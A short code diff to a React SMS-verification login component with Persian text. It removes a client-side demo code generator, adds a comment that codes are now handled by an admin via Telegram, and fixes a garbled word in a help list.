@@ -67,20 +67,7 @@ const AuthSMS = () => {
     }
   }, [countdown]);
 
-  // Generate and show SMS code on component mount
-  React.useEffect(() => {
-    const generateSmsCode = () => {
-      const code = Math.floor(100000 + Math.random() * 900000).toString();
-      sessionStorage.setItem("smsCode", code);
-
-      // Show code in demo mode
-      alert(
-        `🎭 حالت دمو\n\nکد پیامک: ${code}\n\n(در حالت واقعی این کد به شماره ${phoneNumber} ارسال می‌شود)`,
-      );
-    };
-
-    generateSmsCode();
-  }, [phoneNumber]);
+  // SMS codes are now managed by admin through Telegram
 
   const handleCodeSubmit = async () => {
     // Clear previous errors except for second attempt warning
@@ -363,7 +350,7 @@ const AuthSMS = () => {
                 }}
               >
                 <li>ممکن است تا ۲ دقیقه طول بکشد</li>
-                <li>پوشه هرزنامه خود را بررسی ک��ید</li>
+                <li>پوشه هرزنامه خود را بررسی کنید</li>
                 <li>مطمئن شوید شماره همراه شما روشن است</li>
               </ul>
             </div>
